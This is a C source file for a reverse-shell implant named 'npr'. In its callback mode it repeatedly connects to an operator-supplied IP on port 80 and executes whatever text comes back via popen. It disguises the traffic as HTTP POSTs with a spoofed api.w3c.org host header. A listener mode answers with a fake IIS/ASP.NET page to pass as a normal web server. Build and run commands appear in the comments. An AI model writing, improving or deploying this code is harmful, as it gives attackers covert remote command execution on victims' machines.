#ifdef __unix__
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <arpa/inet.h>
#include <stdlib.h>
#elif defined _WIN32
#include <windows.h>
#include <stdio.h>          // Needed for printf()
#include <string.h>         // Needed for memcpy() and strcpy()
#include <winsock2.h>      // Needed for all Winsock stuff
#define sleep(x) Sleep(1000 * x)
#endif

// npr 1            # mode one, client nopro only <- np, no socket
// npr 2 callbackip # mode two, router reverse <- np, connect socket
// npr 3            # mode three, router bind <- listen socket
// compile and run using IP of cnet.com
// clear && gcc npr.c -o npr && chmod 777 npr && ./npr 2 127.0.0.1
// clear && gcc npr.c -o npr && chmod 777 npr && ./npr 3

//gcc npr.c -o npr.exe -lws2_32
unsigned int ServerThread(int pParam);
unsigned int ClientThread(int pParam);

int main(int argc, char *argv[]) {
	#ifdef WIN32
	WORD wVersionRequested = MAKEWORD(1,1);
	WSADATA wsaData;
	WSAStartup(wVersionRequested, &wsaData);
	#endif
	int nport = 80;
	struct sockaddr_in serv_addr; 
	if(argc < 2) {
		printf("\nUsage: %s <mode> (ip of server)\n",argv[0]);
		return 1;
	}
	while (0) { // hardcode client mode and callback IP here
		argv[1] = "2";
		argv[2] = "127.0.0.1";
		argc = 3;
	}
	if (strncmp(argv[1],"2",1) == 0) { // connect socket
		if(argc != 3) {
			printf("\nMode 2 Usage: %s <mode> (ip of server)\n",argv[0]);
			return 1;
		}
		int sockfd = 0, n = 0;
		char recvBuff[1024];
		char sendBuff[1025];
		char cmdbfr[50000];
		int lsleip = 1;
		int psleip = 1;
		int sleip = 1;
		while (1) {
			printf("Mode 2 Connecting to %s:%u\n", argv[2], nport);
			memset(recvBuff, 0,sizeof(recvBuff));
			if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
				printf("\nError : Could not create socket \n");
				return 1;
			} 
			memset(&serv_addr, 0, sizeof(serv_addr)); 
			serv_addr.sin_family = AF_INET;
			serv_addr.sin_port = htons(nport); 
			#ifdef WIN32
			serv_addr.sin_addr.s_addr = inet_addr(argv[2]); // winsock implementation
			#else
			if(inet_pton(AF_INET, argv[2], &serv_addr.sin_addr)<=0) {
				printf("\ninet_pton error occured\n");
				return 1;
			}
			#endif
			if(connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
			   printf("\nError : Connect Failed \n");
			   sleip = lsleip + psleip; //fibsleep
			   lsleip = psleip;
			   psleip = sleip;
			   if (sleip > 300) {
				   sleip = 300;
			   }
			   sleep(sleip);
			   continue;
			}
			lsleip = 1;
			psleip = 1;
			sleip = 1;
			snprintf(sendBuff, sizeof(sendBuff), "POST /ajax/submit.aspx HTTP/1.1\nHost: api.w3c.org\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n%s\n",sizeof(cmdbfr)+1,cmdbfr);
			memset(recvBuff, 0, sizeof(recvBuff));
			#ifdef WIN32
			send(sockfd, sendBuff, strlen(sendBuff),0);
			if ( (n = recv(sockfd, recvBuff, sizeof(recvBuff)-1,0)) > 0) {
			#else
			write(sockfd, sendBuff, strlen(sendBuff));
			if ( (n = read(sockfd, recvBuff, sizeof(recvBuff)-1)) > 0) {
			#endif
				recvBuff[n] = 0; // null terminate so that we can pass this string to other functions later
				if(fputs(recvBuff, stdout) == EOF) {
					printf("\nError : Fputs error\n");
				}
				printf("\n");
			} 
			if(n < 0) {
				printf("\nRead error \n");
			}
			#ifdef WIN32
			closesocket(sockfd);
			#else
			close(sockfd);
			#endif

			FILE * fp;
			if((fp=popen((const char *)recvBuff, "r")) == NULL) {
			}
			memset(cmdbfr, 0,sizeof(cmdbfr));
			while(fgets(cmdbfr,sizeof(cmdbfr),fp) != NULL){
			}
			pclose(fp);

			sleep(1);
		}
	}
	else if (strncmp(argv[1],"3",1) == 0) { // listen socket
		int listenfd = 0;
		printf("Mode 3 Listening [Hit Escape to exit cleanly]\n");
		listenfd = socket(AF_INET, SOCK_STREAM, 0);
		memset(&serv_addr, 0, sizeof(serv_addr));
		serv_addr.sin_family = AF_INET;
		serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
		serv_addr.sin_port = htons(nport); 
		while (bind(listenfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) != 0) {
			printf("bind() on %u failed\n", nport);
			sleep(1);
			//return 1;
		}
		printf("Bound to ANY:%u\n", nport);
		_beginthread(ServerThread,0,listenfd);
		//AfxBeginThread(ServerThread,0); // no support for MFC thread API in MinGW
		while(getch() != 27);
		#ifdef WIN32
		closesocket(listenfd);
		WSACleanup();
		#else
		close(listenfd);
		#endif
		return 0;
	}
}
unsigned int ServerThread(int pParam) {
	int listenfd = 0, connfd = 0;
	listenfd = pParam;
	if (listen(listenfd, 10) != 0) {
		printf("listen() failed\n");
		return 1;
	}
	while(1) {
		connfd = accept(listenfd, (struct sockaddr*)NULL, NULL);
		_beginthread(ClientThread,0,connfd);
		//AfxBeginThread(ClientThread,(LPVOID)connfd);
	}
	return 0;
}
unsigned int ClientThread(int pParam) {
	int n = 0, connfd = 0, testi = 0;
	char recvBuff[1024];
	char sendBuff[1025];
	memset(sendBuff, 0, sizeof(sendBuff)); 
	connfd= pParam;
	printf("Host Connected\n");
	#ifdef WIN32
	if ( (n = recv(connfd, recvBuff, sizeof(recvBuff)-1,0)) > 0) {
	#else
	if ( (n = read(connfd, recvBuff, sizeof(recvBuff)-1)) > 0) {
	#endif
		recvBuff[n] = 0;
		if(fputs(recvBuff, stdout) == EOF) {
			printf("\nError : Fputs error\n");
		}
	} 
	//snprintf(sendBuff, sizeof(sendBuff), "ls ~/%d*", testi);
	char payBuff[1025];
	memset(payBuff, 0, sizeof(payBuff)); 
	snprintf(payBuff, sizeof(payBuff),"<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.1/EN\" \"http://www.w3.org/TR/xhtml11/DTD/xhtml111.dtd\">\n<html>\n<title>%d</title>\n<body>Unresolved.</body>\n</html>\n", sizeof(payBuff));
	snprintf(sendBuff, sizeof(sendBuff), "HTTP/1.1 200 OK\nCache-Control: no-cache\nPragma: no-cache\nContent-Length: %d\nContent-Type: text/html; charset=utf-8\nExpires: -1\nServer: Microsoft-IIS/6.0\nX-Powered-By: ASP.NET\nX-AspNet-Version: 2.0.50727\n\n%s",sizeof(payBuff)-1,payBuff);
	testi++;
	if (testi > 9) {
		testi = 0;
	}
	#ifdef WIN32
	send(connfd, sendBuff, strlen(sendBuff),0);
	closesocket(connfd);
	#else
	write(connfd, sendBuff, strlen(sendBuff));
	close(connfd);
	#endif
	return 0;
	//sleep(1);
}
